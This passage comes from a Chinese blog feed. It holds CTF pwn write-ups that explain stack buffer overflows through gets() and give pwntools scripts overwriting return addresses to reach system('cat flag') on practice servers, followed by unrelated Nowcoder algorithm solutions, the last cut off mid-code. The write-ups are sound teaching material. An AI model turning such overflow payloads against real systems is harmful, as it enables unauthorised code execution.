class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect to the process</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset calculation</span></span><br><span class="line"><span class="comment">#rbp末尾-（rsp+1），其中rsp+1是参数起始位置。</span></span><br><span class="line"><span class="comment">#RSP代表“注册堆栈指针，RBP代表“注册基指针”。</span></span><br><span class="line">offset = <span class="number">0x7fffffffe7a8</span> - <span class="number">0x7fffffffe791</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function address</span></span><br><span class="line">fun = <span class="number">0x0000000000401186</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct the payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * offset + p64(fun)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interact with the process</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注：</p><ol><li>**RSP (Stack Pointer)**：<ul><li>总是指向栈的顶部。</li><li>每次调用函数、压入数据或其他需要使用栈的操作时，<code>RSP</code>都会相应地调整。</li><li>例如，每次执行<code>PUSH</code>指令，<code>RSP</code>都会减去所需的字节数（在x86_64中通常是8字节），因为栈在低地址方向上增长。</li></ul></li><li>**RBP (Base Pointer)**：<ul><li>用作帧指针，在函数调用中，它常常用来作为当前函数的局部变量和参数的基准点。</li><li>在函数调用的开头，通常会看到<code>RBP</code>被设置为<code>RSP</code>的当前值，这标志着函数的开始。</li><li>使用基指针可以更容易地访问函数的局部变量和参数，因为它们通常都是基于<code>RBP</code>的固定偏移。</li></ul></li></ol><h4 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="**4.**获取flag"></a>**4.**获取flag</h4><p>输入ls，发现flag，输入cat flag，完成flag的获取。</p><h2 id="warmup-csaw-2016-1"><a href="#warmup-csaw-2016-1" class="headerlink" title="warmup_csaw_2016  1"></a>warmup_csaw_2016  1</h2><p>20230825</p><p>这一题与上一题很像。</p><h4 id="1-尝试："><a href="#1-尝试：" class="headerlink" title="1.尝试："></a>1.尝试：</h4><p>在ubuntu中，checksec，拖入terminal交互尝试，</p><h4 id="2-分析："><a href="#2-分析：" class="headerlink" title="2.分析："></a>2.分析：</h4><p>在windows中，拖入IDA，F5进入main函数伪代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，s数组的定义后面标注了rsp是0h开始。</p><p>可以突破的点照样是gets()，只不过这次是在return。</p><p>点入函数sub_40060D查看，它在控制台执行了输出flag的命令，这肯定是关键。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40060D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，这个函数的名称也在代表他的地址：0x40060D。</p><p>另外尝试理解这一句，可以问问chatGPT，作用是将sub_40060D的地址写到字符串s。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, sub_40060D);</span><br></pre></td></tr></table></figure><p>查看变量v5，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000040 var_40          db 64 dup(?)</span><br></pre></td></tr></table></figure><p>var_40，可以知道它占位40h，也可以看后面十进制是64位。</p><p>另外，var代表variable，多变的，一般表示变量。</p><h4 id="3-攻击"><a href="#3-攻击" class="headerlink" title="3.攻击"></a>3.攻击</h4><p>ubuntu中打开terminal，输入code，打开vscode。</p><p>可以利用上题的代码稍作修改，经典五行。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29678</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#64表示v5占用的空间，8表示rbp在64位中占8位。最后的转到函数sub_40060D的地址。</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">64</span> + <span class="number">8</span>)+ p64(<span class="number">0x40060D</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>输出如下。</p><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;-Warm Up-</span><br><span class="line">&gt;WOW:0x40060d</span><br><span class="line"></span><br><span class="line">&gt;&gt;flag&#123;bf2fb88a-c858-488b-ab42-50fe90c44d60&#125;</span><br><span class="line">&gt;&gt;timeout: the monitored command dumped core</span><br><span class="line">&gt;&gt;[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure></blockquote><h2 id="ciscn-2019-n-1-1"><a href="#ciscn-2019-n-1-1" class="headerlink" title="ciscn_2019_n_1  1"></a>ciscn_2019_n_1  1</h2><p>0825</p><p>这次我们省略一些作用不太大的流水线操作，直接进入IDA分析</p><h4 id="1-分析函数"><a href="#1-分析函数" class="headerlink" title="1.分析函数"></a>1.分析函数</h4><p>IDA打开文件，进入main函数，发现有一个func()函数引起了我们的注意。</p><p>在func函数中，我们注意到return system(“cat &#x2F;flag”);是我们所需要的，</p><p>而gets函数正中我们溢出攻击的下怀。</p><p>于是思路出现：</p><p>使v2变成浮点数11.28125，来执行return system(“cat &#x2F;flag”);</p><p>或</p><p>直接溢出使return system(“cat &#x2F;flag”);执行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  gets(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-分析变量"><a href="#2-分析变量" class="headerlink" title="2.分析变量"></a>2.分析变量</h4><p>双击v1，我们会看到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000030 ; D/A/*   : change type (data/ascii/array)</span><br><span class="line">-0000000000000030 ; N       : rename</span><br><span class="line">-0000000000000030 ; U       : undefine</span><br><span class="line">-0000000000000030 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-0000000000000030 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-0000000000000030 ; Frame size: 30; Saved regs: 8; Purge: 0</span><br><span class="line">-0000000000000030 ;</span><br><span class="line">-0000000000000030</span><br><span class="line">-0000000000000030 var_30          db 44 dup(?)</span><br><span class="line">-0000000000000004 var_4           dd ?</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure><p>注意：在汇编语言中，<code>db</code> 是 “define byte” 的缩写，用于定义一个或多个字节的数据。</p><p><code>dup</code> 是 “duplicate” 的缩写，常用于汇编语言中表示重复某个值多次。</p><p><code>dd</code> 是 “define doubleword” 的缩写。一个doubleword通常表示4字节（或32位）的数据。</p><p>问号表示每个字节的值是未指定的。</p><p>显示的阴影部分在var_30，而下一个变量v2在var_4位置</p><p>即v1数组从30h开始，到4h。</p><p>30h-4h&#x3D;2Bh&#x3D;44b，刚好是后面的44b。</p><p>即，v1占了44位，而v2占了4位。</p><p>剩下的“s”即rbp，占8位</p><p>“r”为return，占8位。</p><h4 id="3-编写脚本"><a href="#3-编写脚本" class="headerlink" title="3.编写脚本"></a>3.编写脚本</h4><p>第一种方法：使v2变成浮点数11.28125，来执行return system(“cat &#x2F;flag”);</p><p>填满v1之后就是v2了，直接要求的数字，满足 <strong>v2 &#x3D;&#x3D; 11.28125</strong> 的判断式</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">44</span> +  p64(<span class="number">0x41348000</span>)</span><br><span class="line"><span class="comment">#11.28125=0x41348000</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>第二种方法：直接溢出使return system(“cat &#x2F;flag”);执行</p><p>在func函数视图单击空格，会出现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006BE                 mov     edi, offset command ; &quot;cat /flag&quot;</span><br><span class="line">.text:00000000004006C3                 mov     eax, 0</span><br><span class="line">.text:00000000004006C8                 call    _system</span><br><span class="line">.text:00000000004006CD                 jmp     short loc_4006D9</span><br></pre></td></tr></table></figure><p>注意此处的00000000004006BE地址，就是我们要的返回地址。</p><p>分号后面有一句 “cat &#x2F;flag”，这是注释，说明执行这一句。</p><p>注：</p><p>1.在 x86_64 架构中的 calling convention，<code>EDI</code> 寄存器（或其64位版本 <code>RDI</code>）经常用于传递函数的第一个参数。</p><p>2.在 x86_64 架构中，当调用某些函数时，<code>EAX</code> 寄存器用于指示要使用的参数数量，特别是变长参数的函数。在这种情境下，这行代码可能是为了告诉系统函数 “_system” 不带额外的参数。</p><p>3.<strong>call    _system</strong>调用了system函数，用于执行命令。</p><p>4.<strong>jmp     short loc_4006D9</strong>表示调到某地址，我们双击它，可来到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006D9 loc_4006D9:                             ; CODE XREF: func+57↑j</span><br><span class="line">.text:00000000004006D9                 nop</span><br><span class="line">.text:00000000004006DA                 leave</span><br><span class="line">.text:00000000004006DB                 retn</span><br></pre></td></tr></table></figure><p>这三个指令通常出现在函数的结尾。让我们逐一解释它们的作用：</p><ol><li><p><code>.text:00000000004006D9 nop</code></p><p><code>nop</code> 指令是 “No Operation” 的缩写，意味着它不执行任何操作。它的主要用途是为了代码对齐或在二进制中填充空间。有时，<code>nop</code> 也在调试或分析时被使用，因为你可以安全地替换它而不改变程序的功能。</p></li><li><p><code>.text:00000000004006DA leave</code></p><p><code>leave</code> 指令是函数结束时常见的指令，它执行两个主要操作：</p><ul><li>将 <code>RBP</code> 寄存器的值加载到 <code>RSP</code> 寄存器。这将堆栈指针 <code>RSP</code> 重置为它在函数入口时的位置。</li><li>之后，它从堆栈中弹出一个值到 <code>RBP</code> 寄存器。这恢复了调用函数时 <code>RBP</code> 寄存器的原始值。</li></ul><p>总的来说，这实际上是 <code>mov rsp, rbp</code> 和 <code>pop rbp</code> 两个指令的组合。</p></li><li><p><code>.text:00000000004006DB retn</code></p><p><code>retn</code> 指令从堆栈中弹出一个返回地址并跳转到那个地址，这结束了当前的函数调用，程序的控制权返回到调用此函数的代码。在 x86 架构中，<code>retn</code> 和 <code>ret</code> 是等价的。</p></li></ol><p>结合起来看，这些指令在函数结束时恢复了原始的堆栈和帧指针，并返回到调用此函数的地方。</p><p>python脚本代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25580</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">44</span> + <span class="number">4</span> + <span class="number">8</span>)  +  p64(<span class="number">0x4006BE</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">按顺序填满v1，v2，rbp，分别为44 , 4 ,8位。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后把返回地址用0x4006BE覆盖，执行cat /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/CTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF做题记录</category>
      
      
      <comments>https://cjliblog.top/2023/08/25/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BF%9E%E8%BD%BD%EF%BC%89/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16593铺地毯</title>
      <link>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/</link>
      <guid>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/</guid>
      <pubDate>Sat, 12 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p>题目来源：<a href="https://ac.nowcoder.com/acm/problem/16589">https://ac.nowcoder.com/acm/problem/16593</a></p><p><code>hello</code></p><p>思路：</p><p>就是把每一组地毯存到二维数组里，一行代表一张地毯。</p><p>然后自上而下判断某点的地毯，得到的马上break，就是最上面的。</p><p>首先进行存储：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> n,res;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="type">int</span> a[<span class="number">10000</span>][<span class="number">10000</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自上而下进行check操作，判断某张毯子是否是答案：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x,y;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">check</span>(a[i],x,y))&#123;</span><br><span class="line">        res=i;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check稍微用了一下指针，也可以直接用下标的：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span>* p,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((*p&lt;=x&amp;&amp;(*(p+<span class="number">2</span>)+*p)&gt;=x)&amp;&amp;(*(p+<span class="number">1</span>)&lt;=y&amp;&amp;(*(p+<span class="number">3</span>)+*(p+<span class="number">1</span>)&gt;=y)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出答案需要+1，因为毯子从1开始：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cout&lt;&lt;res+<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>就OK辽！</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(<span class="type">int</span>* p,<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((*p&lt;=x&amp;&amp;(*(p+<span class="number">2</span>)+*p)&gt;=x)&amp;&amp;(*(p+<span class="number">1</span>)&lt;=y&amp;&amp;(*(p+<span class="number">3</span>)+*(p+<span class="number">1</span>)&gt;=y)))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,res;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>][<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">            cin&gt;&gt;a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(a[i],x,y))&#123;</span><br><span class="line">            res=i;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;res+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/13/NC16593%E9%93%BA%E5%9C%B0%E6%AF%AF/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16589机器翻译【题解】【入门向】</title>
      <link>https://cjliblog.top/2023/08/05/NC16589%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91/</link>
      <guid>https://cjliblog.top/2023/08/05/NC16589%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91/</guid>
      <pubDate>Fri, 04 Aug 2023 16:00:00 GMT</pubDate>
      
      <description>大家好，我是description</description>
      
      
      
      <content:encoded><![CDATA[<p>题目来源：<a href="https://ac.nowcoder.com/acm/problem/16589">机器翻译</a></p><p><code>hello</code></p><p>首先明确需求：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一个内存，输入，存储查字典次数的变量</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;a;<span class="comment">//内存容器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">    cin&gt;&gt;b[i];<span class="comment">//输入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans=<span class="number">0</span>;<span class="comment">//存储查字典次数的变量</span></span><br></pre></td></tr></table></figure><p>在循环内，我们需要知道是否内存内有和输入重复的元素：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it=a.<span class="built_in">begin</span>();it!=a.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(*it==b[i]) flag=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有重复，我会push进一个输入：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(flag) </span><br><span class="line">&#123;</span><br><span class="line">    a.<span class="built_in">push_back</span>(b[i]);ans++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，如果内存达到上限，我会把内存第一个元素删掉：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(a.<span class="built_in">size</span>()==m+<span class="number">1</span>) a.<span class="built_in">erase</span>(a.<span class="built_in">begin</span>());</span><br></pre></td></tr></table></figure><p>就OK辽！</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//一个内存，输入，存储查字典次数的变量</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;a;</span><br><span class="line">    <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> m,n;</span><br><span class="line">    cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> b[<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> flag=<span class="number">1</span>;</span><br><span class="line">        cin&gt;&gt;b[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> it=a.<span class="built_in">begin</span>();it!=a.<span class="built_in">end</span>();it++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(*it==b[i]) flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag) </span><br><span class="line">        &#123;</span><br><span class="line">            a.<span class="built_in">push_back</span>(b[i]);ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a.<span class="built_in">size</span>()==m+<span class="number">1</span>) a.<span class="built_in">erase</span>(a.<span class="built_in">begin</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/.top//11953\desktop\hahahaha.jpg" alt="hahahaha"></p>]]></content:encoded>
      
      
      
      <category domain="https://cjliblog.top/tags/%E7%89%9B%E5%AE%A2%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80%E7%B2%BE%E9%80%89/">牛客算法基础精选</category>
      
      
      <comments>https://cjliblog.top/2023/08/05/NC16589%E6%9C%BA%E5%99%A8%E7%BF%BB%E8%AF%91/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NC16622多项式输出【题解】【入门向】</title>
      <link>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/</link>
      <guid>https://cjliblog.top/2023/08/04/NC16622%E5%A4%9A%E9%A1%B9%E5%BC%8F%E8%BE%93%E5%87%BA/</guid>
      <pubDate>Thu, 03 Aug 2023 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;题目来源：&lt;a href=&quot;https://ac.nowcoder.com/acm/problem/16622&quot;&gt;多项式输出&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这道题在做的时候给自己挖了个坑，其实把符号、系数、指数分开来看会更好实现。&lt;/p&gt;
&lt;p&gt;这里先给出不断调试给出的答案，思路不</description>
        
      
      
      
      <content:encoded><![CDATA[<p>题目来源：<a href="https://ac.nowcoder.com/acm/problem/16622">多项式输出</a></p><p>这道题在做的时候给自己挖了个坑，其实把符号、系数、指数分开来看会更好实现。</p><p>这里先给出不断调试给出的答案，思路不是一蹴而就的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一</span><br><span class="line">输入：</span><br><span class="line">5</span><br><span class="line">100 -1 1 -3 0 10</span><br><span class="line">输出：</span><br><span class="line">100x^5-x^4+x^3-3x^2+10</span><br><span class="line"></span><br><span class="line">二</span><br><span class="line">输入：</span><br><span class="line">3</span><br><span class="line">输出：</span><br><span class="line">-50 0 0 1</span><br><span class="line">-50x^3+1</span><br></pre></td></tr></table></figure><p>首先看到示例。这样的示例是不够的，因为指数为1的时候x后面是不带“^”的，但是此处并未给出指数为1时的示例，因此可以自己给出一个综合性比较强的调试示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">三</span><br><span class="line">输入：</span><br><span class="line">5</span><br><span class="line">0 -1 1 10 0 1 -1</span><br><span class="line">输出：</span><br><span class="line">-x^4+x^3+10x^2+1</span><br></pre></td></tr></table></figure><p>开始our 工程！</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> cnt=n;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10000</span>];</span><br></pre></td></tr></table></figure><p>首先进行输入的读取，存到n，由于这个n是题目给出的常量，最好不要动，所以我们用cnt来作为变量暂时存储n，以备不时之需。另外根据示例，我们需要输入n+1个指数，因此用数组来存储。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    cnt++;</span><br><span class="line">    <span class="keyword">while</span>(cnt--)</span><br><span class="line">    &#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此处使用了一个简单的while循环来输入存储数组，cnt充当计数君，不要忘记有n+1个数据所以要先cnt++</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">    cnt=n;</span><br><span class="line">    <span class="type">int</span> meiyoufuhao=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            meiyoufuhao=i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]!=<span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i==meiyoufuhao)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>) cout&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">if</span>(a[i]==<span class="number">-1</span>) cout&lt;&lt;<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(a[i])!=<span class="number">1</span>||a[i]==<span 